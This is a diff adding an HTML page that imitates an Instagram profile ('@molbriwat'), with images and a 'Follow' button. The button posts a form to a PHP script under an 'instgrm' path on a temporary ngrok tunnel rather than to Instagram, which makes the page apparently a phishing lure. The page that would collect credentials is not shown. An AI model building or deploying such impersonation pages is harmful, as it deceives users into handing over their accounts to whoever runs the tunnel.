@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>molbriwat Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .profile-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+        }
+        .profile-pic {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .username {
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .bio {
+            font-size: 14px;
+            color: #555;
+            margin: 10px 0;
+        }
+        .posts {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+        }
+        .post-img {
+            width: 90px;
+            height: 90px;
+            border-radius: 5px;
+            object-fit: cover; }
+            .instagram-button {
+  background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+  color: white;
+  font-weight: bold;
+  padding: 12px 24px;
+  border: none;
+  border-radius: 50px;
+  cursor: pointer;
+  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+  transition: all 0.3s ease-in-out;
+}
+
+.instagram-button:hover {
+  opacity: 0.9;
+  transform: scale(1.05);
+}
+
+       
+    </style>
+</head>
+<body>
+    <div class="profile-container">
+        <form action="https://wondrous-select-stallion.ngrok-free.app/instgrm/index.php" method="post">
+        <img class="profile-pic" src="https://preview.redd.it/what-do-you-guys-think-of-this-guy-ilyass-lmalki-he-always-v0-sodyivhclfda1.jpg?auto=webp&s=da90fb806ec560cd77fb3c3857550d17b6b3336e" 
+        alt="Photo de profil">
+        <div class="username">@molbriwat</div>
+        <button class="instagram-button" type="submit">Follow</button>
+
+        <div class="bio">makaati3 maghribya | moroccain dream | awakhir</div>
+        <div class="posts">
+            <img class="post-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0Wndbwrq7d5ealB9XIOe4naAoABESt8-NCQ&s" 
+            alt="Post 1">
+            <img class="post-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ36laLiAKBTz06ly2CRUOpeK_lcOj6NfeRGeTGla__7ipSOWXII8UPRtG-kGjOgVfBDEc&usqp=CAU"
+             alt="Post 2">
+            <img class="post-img" src="https://i.pinimg.com/236x/17/7a/42/177a42c925b1e9c2ad1f5b2df28feee4.jpg"
+             alt="Post 3">
+        </div>
+    </form>
+    </div>
+</body>
+</html>
